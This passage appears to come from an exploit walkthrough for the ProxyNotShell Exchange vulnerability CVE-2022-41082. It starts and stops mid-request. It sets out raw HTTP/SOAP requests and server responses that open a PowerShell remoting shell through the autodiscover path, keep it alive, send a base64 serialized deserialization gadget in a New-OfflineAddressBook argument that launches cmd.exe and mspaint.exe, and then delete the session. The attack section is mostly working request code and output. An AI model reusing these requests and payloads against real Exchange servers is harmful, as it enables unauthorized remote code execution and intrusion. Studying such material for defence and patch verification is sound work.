                        <creationXml xmlns="http://schemas.microsoft.com/powershell">AAAAAAAAAAEAAAAAAAAAAAMAAADHAgAAAAIAAQCkwAes2LBAQZqGoPGMPzz/AAAAAAAAAAAAAAAAAAAAADxPYmogUmVmSWQ9IjAiPjxNUz48VmVyc2lvbiBOPSJwcm90b2NvbHZlcnNpb24iPjIuMzwvVmVyc2lvbj48VmVyc2lvbiBOPSJQU1ZlcnNpb24iPjIuMDwvVmVyc2lvbj48VmVyc2lvbiBOPSJTZXJpYWxpemF0aW9uVmVyc2lvbiI+MS4xLjAuMTwvVmVyc2lvbj48L01TPjwvT2JqPgAAAAAAAAACAAAAAAAAAAADAAAOiwIAAAAEAAEApMAHrNiwQEGahqDxjD88/wAAAAAAAAAAAAAAAAAAAAA8T2JqIFJlZklkPSIwIj48TVM+PEkzMiBOPSJNaW5SdW5zcGFjZXMiPjE8L0kzMj48STMyIE49Ik1heFJ1bnNwYWNlcyI+MTwvSTMyPjxPYmogTj0iUFNUaHJlYWRPcHRpb25zIiBSZWZJZD0iMSI+PFROIFJlZklkPSIwIj48VD5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcy5QU1RocmVhZE9wdGlvbnM8L1Q+PFQ+U3lzdGVtLkVudW08L1Q+PFQ+U3lzdGVtLlZhbHVlVHlwZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PFRvU3RyaW5nPkRlZmF1bHQ8L1RvU3RyaW5nPjxJMzI+MDwvSTMyPjwvT2JqPjxPYmogTj0iQXBhcnRtZW50U3RhdGUiIFJlZklkPSIyIj48VE4gUmVmSWQ9IjEiPjxUPlN5c3RlbS5UaHJlYWRpbmcuQXBhcnRtZW50U3RhdGU8L1Q+PFQ+U3lzdGVtLkVudW08L1Q+PFQ+U3lzdGVtLlZhbHVlVHlwZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PFRvU3RyaW5nPlVua25vd248L1RvU3RyaW5nPjxJMzI+MjwvSTMyPjwvT2JqPjxPYmogTj0iQXBwbGljYXRpb25Bcmd1bWVudHMiIFJlZklkPSIzIj48VE4gUmVmSWQ9IjIiPjxUPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNQcmltaXRpdmVEaWN0aW9uYXJ5PC9UPjxUPlN5c3RlbS5Db2xsZWN0aW9ucy5IYXNodGFibGU8L1Q+PFQ+U3lzdGVtLk9iamVjdDwvVD48L1ROPjxEQ1Q+PEVuPjxTIE49IktleSI+UFNWZXJzaW9uVGFibGU8L1M+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjQiPjxUTlJlZiBSZWZJZD0iMiIgLz48RENUPjxFbj48UyBOPSJLZXkiPlBTVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+NS4xLjE5MDQxLjYxMDwvVmVyc2lvbj48L0VuPjxFbj48UyBOPSJLZXkiPlBTRWRpdGlvbjwvUz48UyBOPSJWYWx1ZSI+RGVza3RvcDwvUz48L0VuPjxFbj48UyBOPSJLZXkiPlBTQ29tcGF0aWJsZVZlcnNpb25zPC9TPjxPYmogTj0iVmFsdWUiIFJlZklkPSI1Ij48VE4gUmVmSWQ9IjMiPjxUPlN5c3RlbS5WZXJzaW9uW108L1Q+PFQ+U3lzdGVtLkFycmF5PC9UPjxUPlN5c3RlbS5PYmplY3Q8L1Q+PC9UTj48TFNUPjxWZXJzaW9uPjEuMDwvVmVyc2lvbj48VmVyc2lvbj4yLjA8L1ZlcnNpb24+PFZlcnNpb24+My4wPC9WZXJzaW9uPjxWZXJzaW9uPjQuMDwvVmVyc2lvbj48VmVyc2lvbj41LjA8L1ZlcnNpb24+PFZlcnNpb24+NS4xLjE5MDQxLjYxMDwvVmVyc2lvbj48L0xTVD48L09iaj48L0VuPjxFbj48UyBOPSJLZXkiPkNMUlZlcnNpb248L1M+PFZlcnNpb24gTj0iVmFsdWUiPjQuMC4zMDMxOS40MjAwMDwvVmVyc2lvbj48L0VuPjxFbj48UyBOPSJLZXkiPkJ1aWxkVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+MTAuMC4xOTA0MS42MTA8L1ZlcnNpb24+PC9Fbj48RW4+PFMgTj0iS2V5Ij5XU01hblN0YWNrVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+My4wPC9WZXJzaW9uPjwvRW4+PEVuPjxTIE49IktleSI+UFNSZW1vdGluZ1Byb3RvY29sVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+Mi4zPC9WZXJzaW9uPjwvRW4+PEVuPjxTIE49IktleSI+U2VyaWFsaXphdGlvblZlcnNpb248L1M+PFZlcnNpb24gTj0iVmFsdWUiPjEuMS4wLjE8L1ZlcnNpb24+PC9Fbj48L0RDVD48L09iaj48L0VuPjwvRENUPjwvT2JqPjxPYmogTj0iSG9zdEluZm8iIFJlZklkPSI2Ij48TVM+PE9iaiBOPSJfaG9zdERlZmF1bHREYXRhIiBSZWZJZD0iNyI+PE1TPjxPYmogTj0iZGF0YSIgUmVmSWQ9IjgiPjxUTiBSZWZJZD0iNCI+PFQ+U3lzdGVtLkNvbGxlY3Rpb25zLkhhc2h0YWJsZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PERDVD48RW4+PEkzMiBOPSJLZXkiPjk8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iOSI+PE1TPjxTIE49IlQiPlN5c3RlbS5TdHJpbmc8L1M+PFMgTj0iViI+QWRtaW5pc3RyYXRvcjogV2luZG93cyBQb3dlclNoZWxsPC9TPjwvTVM+PC9PYmo+PC9Fbj48RW4+PEkzMiBOPSJLZXkiPjg8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iMTAiPjxNUz48UyBOPSJUIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZTwvUz48T2JqIE49IlYiIFJlZklkPSIxMSI+PE1TPjxJMzIgTj0id2lkdGgiPjI3NDwvSTMyPjxJMzIgTj0iaGVpZ2h0Ij43MjwvSTMyPjwvTVM+PC9PYmo+PC9NUz48L09iaj48L0VuPjxFbj48STMyIE49IktleSI+NzwvSTMyPjxPYmogTj0iVmFsdWUiIFJlZklkPSIxMiI+PE1TPjxTIE49IlQiPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uSG9zdC5TaXplPC9TPjxPYmogTj0iViIgUmVmSWQ9IjEzIj48TVM+PEkzMiBOPSJ3aWR0aCI+MTIwPC9JMzI+PEkzMiBOPSJoZWlnaHQiPjcyPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij42PC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE0Ij48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LlNpemU8L1M+PE9iaiBOPSJWIiBSZWZJZD0iMTUiPjxNUz48STMyIE49IndpZHRoIj4xMjA8L0kzMj48STMyIE49ImhlaWdodCI+NTA8L0kzMj48L01TPjwvT2JqPjwvTVM+PC9PYmo+PC9Fbj48RW4+PEkzMiBOPSJLZXkiPjU8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iMTYiPjxNUz48UyBOPSJUIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZTwvUz48T2JqIE49IlYiIFJlZklkPSIxNyI+PE1TPjxJMzIgTj0id2lkdGgiPjEyMDwvSTMyPjxJMzIgTj0iaGVpZ2h0Ij4zMDAwPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij40PC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE4Ij48TVM+PFMgTj0iVCI+U3lzdGVtLkludDMyPC9TPjxJMzIgTj0iViI+MjU8L0kzMj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4zPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE5Ij48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LkNvb3JkaW5hdGVzPC9TPjxPYmogTj0iViIgUmVmSWQ9IjIwIj48TVM+PEkzMiBOPSJ4Ij4wPC9JMzI+PEkzMiBOPSJ5Ij4wPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4yPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjIxIj48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LkNvb3JkaW5hdGVzPC9TPjxPYmogTj0iViIgUmVmSWQ9IjIyIj48TVM+PEkzMiBOPSJ4Ij4wPC9JMzI+PEkzMiBOPSJ5Ij45PC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4xPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjIzIj48TVM+PFMgTj0iVCI+U3lzdGVtLkNvbnNvbGVDb2xvcjwvUz48STMyIE49IlYiPjU8L0kzMj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4wPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjI0Ij48TVM+PFMgTj0iVCI+U3lzdGVtLkNvbnNvbGVDb2xvcjwvUz48STMyIE49IlYiPjY8L0kzMj48L01TPjwvT2JqPjwvRW4+PC9EQ1Q+PC9PYmo+PC9NUz48L09iaj48QiBOPSJfaXNIb3N0TnVsbCI+ZmFsc2U8L0I+PEIgTj0iX2lzSG9zdFVJTnVsbCI+ZmFsc2U8L0I+PEIgTj0iX2lzSG9zdFJhd1VJTnVsbCI+ZmFsc2U8L0I+PEIgTj0iX3VzZVJ1bnNwYWNlSG9zdCI+ZmFsc2U8L0I+PC9NUz48L09iaj48L01TPjwvT2JqPg==</creationXml>
                </rsp:Shell>
        </s:Body>
</s:Envelope>
```

- response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: 9e7c0cd2-dffd-48da-8fd4-c0e272cecb1f
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc7Lxc/GgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:14:09 GMT; path=/autodiscover; secure; HttpOnly
Persistent-Auth: true
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 09:14:09 GMT
Content-Length: 866

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/CreateResponse</a:Action><a:MessageID>uuid:7F45298C-DA0C-4B21-8345-C1064F467C36</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:89d1d533-39ea-4e1f-b566-463e276e9ce8</a:RelatesTo></s:Header><s:Body><x:ResourceCreated><a:Address>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:Address><a:ReferenceParameters><w:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI><w:SelectorSet><w:Selector Name="ShellId">29E4FDEC-DF97-4A5B-A515-8D25F7CD3437</w:Selector></w:SelectorSet></a:ReferenceParameters></x:ResourceCreated><rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"><rsp:ShellId>29E4FDEC-DF97-4A5B-A515-8D25F7CD3437</rsp:ShellId><rsp:ResourceUri>http://schemas.microsoft.com/powershell/Microsoft.Exchange</rsp:ResourceUri><rsp:Owner>exchange2016\administrator</rsp:Owner><rsp:ClientIP>fe80::841b:99cc:dec2:b8a%5</rsp:ClientIP><rsp:IdleTimeOut>PT900.000S</rsp:IdleTimeOut><rsp:InputStreams>stdin pr</rsp:InputStreams><rsp:OutputStreams>stdout</rsp:OutputStreams><rsp:ShellRunTime>P0DT0H0M0S</rsp:ShellRunTime><rsp:ShellInactivity>P0DT0H0M0S</rsp:ShellInactivity></rsp:Shell></s:Body></s:Envelope>
```

### step2

An HTTP POST request that uses XML SOAP to extend the lifetime of the shell

After starting the shell, the attacker immediately extends its lifetime; otherwise, by default, the shell would be closed because its expiry time is too short. This is necessary to execute further commands on the Exchange Server. To do this, the attacker immediately sends a special request over WSMAN with the keep alive option enabled.

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxynotshell6.png)

- request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3NxczJgZqHnJeekZiazc/OydGckJKBzw==; Email=autodiscover/admin@localhost
Content-Length: 1731

<s:Envelope xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wsmv="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
    <s:Header>
        <wsa:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</wsa:Action>
        <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:Locale s:mustUnderstand="false" xml:lang="en-US" />
        <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
        <wsa:MessageID>uuid:e7b63b02-c710-4671-8bc8-ef16fbd3dd2f</wsa:MessageID>
        <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
        <wsa:ReplyTo>
            <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
        </wsa:ReplyTo>
        <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
        <wsmv:SessionId s:mustUnderstand="false">uuid:9f62f84e-9ccf-47dc-9c85-44528f897ec6</wsmv:SessionId>
        <wsa:To>http://ex01.lab.local/</wsa:To>
        <wsman:OptionSet s:mustUnderstand="true">
            <wsman:Option Name="WSMAN_CMDSHELL_OPTION_KEEPALIVE">True</wsman:Option>
        </wsman:OptionSet>
        <wsman:SelectorSet>
            <wsman:Selector Name="ShellId">84E4CBD2-CE57-4D84-B623-0ADD3EBAFF2A</wsman:Selector>
        </wsman:SelectorSet>
    </s:Header>
    <s:Body>
        <rsp:Receive>
            <rsp:DesiredStream>stdout</rsp:DesiredStream>
        </rsp:Receive>
    </s:Body>
        </s:Envelope>
```

- response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: bc066085-69d9-4848-909a-c24723f86a29
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3NxczIgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:22:37 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 09:22:36 GMT
Content-Length: 678

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/ReceiveResponse</a:Action><a:MessageID>uuid:6747A94B-9EB8-479A-9A52-F85A259A1B3D</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:e7b63b02-c710-4671-8bc8-ef16fbd3dd2f</a:RelatesTo></s:Header><s:Body><rsp:ReceiveResponse><rsp:Stream Name="stdout">AAAAAAAACmcAAAAAAAAAAAMAAADKAQAAAAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO+7vzxPYmogUmVmSWQ9IjAiPjxNUz48VmVyc2lvbiBOPSJwcm90b2NvbHZlcnNpb24iPjIuMzwvVmVyc2lvbj48VmVyc2lvbiBOPSJQU1ZlcnNpb24iPjIuMDwvVmVyc2lvbj48VmVyc2lvbiBOPSJTZXJpYWxpemF0aW9uVmVyc2lvbiI+MS4xLjAuMTwvVmVyc2lvbj48L01TPjwvT2JqPg==</rsp:Stream></rsp:ReceiveResponse></s:Body></s:Envelope>
```

### step3

An HTTP POST request that uses XML SOAP to start a new process

After that, the attacker exploits the second vulnerability, CVE-2022-41082. Using PowerShell Remoting, the attacker sends a request that creates an address book, passing encoded and serialized data with a special payload as a parameter. In the published PoC this encoded data contains a gadget named System.UnitySerializationHolder that produces an object of the System.Windows.Markup.XamlReader class. That class processes the XAML data from the payload, which creates a new object of the System.Diagnostics class, and a method call that opens a new process on the target system. In the PoC published online this process is calc.exe.

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxynotshell7.png)

The main payload part that runs the calc.exe process

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxynotshell8.png)

- request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3HxcvPgZqHnJeekZiazc/OydGckJKBzw==; Email=autodiscover/admin@localhost
Content-Length: 4071

<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
        <s:Header>
                <a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
                <a:ReplyTo>
                        <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
                </a:ReplyTo>
                <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
                <w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
                <a:MessageID>uuid:5dc68edc-045d-4639-a3a2-f11b0c3d9d24</a:MessageID>
                <w:Locale xml:lang="en-US" s:mustUnderstand="false" />
                <p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
                <p:SessionId s:mustUnderstand="false">uuid:92d15a07-25ed-455c-913c-f75b789db485</p:SessionId>
                <p:OperationID s:mustUnderstand="false">uuid:86aa8b58-a678-4f53-a86b-c0ca5fde4238</p:OperationID>
                <p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
                <w:ResourceURI xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
                <w:SelectorSet xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
                        <w:Selector Name="ShellId">7ECF1934-4CC8-4322-B6C7-54FE32AFB3DC</w:Selector>
                </w:SelectorSet>
                <w:OperationTimeout>PT180.000S</w:OperationTimeout>
        </s:Header>
        <s:Body>
        <rsp:CommandLine xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" CommandId="f09f9889-40ba-4a66-8b8f-be91c03e8376" >
                <rsp:Command>New-OfflineAddressBook</rsp:Command>
                <rsp:Arguments>AAAAAAAAAAMAAAAAAAAAAAMAAAZ6AgAAAAYQAgDw5UZdjgU/Qqbzjccy2sTUiZif8LpAZkqLj76RwD6DdjxPYmogUmVmSWQ9IjEzIj4KCQkJPFROIFJlZklkPSIwIj4KCQkJCTxUPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3Q8L1Q+CgkJCQk8VD5TeXN0ZW0uT2JqZWN0PC9UPgoJCQk8L1ROPgoJCQk8TVM+CgkJCQk8UyBOPSJOIj4tSWRlbnRpdHk6PC9TPgoJCQkJCQkJCTwhLS1PYmplY3QgdHlwZSBzZWN0aW9uLS0+CgkJCQk8T2JqIE49IlYiIFJlZklkPSIxNCI+CgkJCQkJPFROIFJlZklkPSIyIj4KCQkJCQk8VD5TeXN0ZW0uU2VydmljZVByb2Nlc3MuU2VydmljZUNvbnRyb2xsZXI8L1Q+CgkJCQkJCTxUPlN5c3RlbS5PYmplY3Q8L1Q+CgkJCQkJPC9UTj4KCQkJCQk8VG9TdHJpbmc+U3lzdGVtLlNlcnZpY2VQcm9jZXNzLlNlcnZpY2VDb250cm9sbGVyPC9Ub1N0cmluZz4KCgkJCQkJPFByb3BzPgoJCQkJCQk8UyBOPSJOYW1lIj5UeXBlPC9TPgoJCQkJCQk8T2JqIE49IlRhcmdldFR5cGVGb3JEZXNlcmlhbGl6YXRpb24iPgoJCQkJCQkJPFROIFJlZklkPSIyIj4KCQkJCQkJCQk8VD5TeXN0ZW0uRXhjZXB0aW9uPC9UPgoJCQkJCQkJCTxUPlN5c3RlbS5PYmplY3Q8L1Q+CgkJCQkJCQk8L1ROPgoJCQkJCQkJPE1TPgoJCQkJCQkJCTxCQSBOPSJTZXJpYWxpemF0aW9uRGF0YSI+QUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFFQVFBQUFCOVRlWE4wWlcwdVZXNXBkSGxUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5QXdBQUFBUkVZWFJoQ1ZWdWFYUjVWSGx3WlF4QmMzTmxiV0pzZVU1aGJXVUJBQUVJQmdJQUFBQWdVM2x6ZEdWdExsZHBibVJ2ZDNNdVRXRnlhM1Z3TGxoaGJXeFNaV0ZrWlhJRUFBQUFCZ01BQUFCWVVISmxjMlZ1ZEdGMGFXOXVSbkpoYldWM2IzSnJMQ0JXWlhKemFXOXVQVFF1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OU16Rmlaak00TlRaaFpETTJOR1V6TlFzPTwvQkE+CgkJCQkJCQk8L01TPgoJCQkJCQk8L09iaj4KCQkJCQk8L1Byb3BzPgoKCQkJCQk8Uz4KICAgICAgICAgICAgICAgICAgICAgICAgPCFbQ0RBVEFbPFJlc291cmNlRGljdGlvbmFyeSB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgeG1sbnM6U3lzdGVtPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiIgeG1sbnM6RGlhZz0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9c3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJMYXVuY2hDYWxjaCIgT2JqZWN0VHlwZT0ie3g6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lPSJTdGFydCI+PE9iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPjxTeXN0ZW06U3RyaW5nPmNtZC5leGU8L1N5c3RlbTpTdHJpbmc+PFN5c3RlbTpTdHJpbmc+L2MgbXNwYWludC5leGU8L1N5c3RlbTpTdHJpbmc+IDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+IDwvT2JqZWN0RGF0YVByb3ZpZGVyPiA8L1Jlc291cmNlRGljdGlvbmFyeT5dXT4KCQkJCQk8L1M+CgoJCQkJPC9PYmo+CgkJCTwvTVM+CgkJPC9PYmo+Cgk=</rsp:Arguments>
        </rsp:CommandLine>
</s:Body>
</s:Envelope>
```

- response

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/soap+xml;charset=UTF-8
Content-Encoding: gzip
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: c3f52c2f-ada3-402f-b035-e837b53c40aa
X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3HxcvPgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:28:40 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: WIN-UPF09R7H264
Date: Fri, 08 Sep 2023 09:28:39 GMT
Content-Length: 537

<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandResponse</a:Action><a:MessageID>uuid:0CBC5ED1-668F-47AB-8CBD-895723CAFF63</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:5dc68edc-045d-4639-a3a2-f11b0c3d9d24</a:RelatesTo></s:Header><s:Body><rsp:CommandResponse><rsp:CommandId>F09F9889-40BA-4A66-8B8F-BE91C03E8376</rsp:CommandId></rsp:CommandResponse></s:Body></s:Envelope>
```

### step4

The attack ends and the SessionId is removed, so the vulnerability can be exploited again

- request

``` bash
POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
Host: 192.168.14.6
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/soap+xml;charset=UTF-8
Cookie: Email=autodiscover/admin@localhost
Content-Length: 1375

<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wsmv="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
    <s:Header>
        <wsa:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</wsa:Action>
        <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US" />
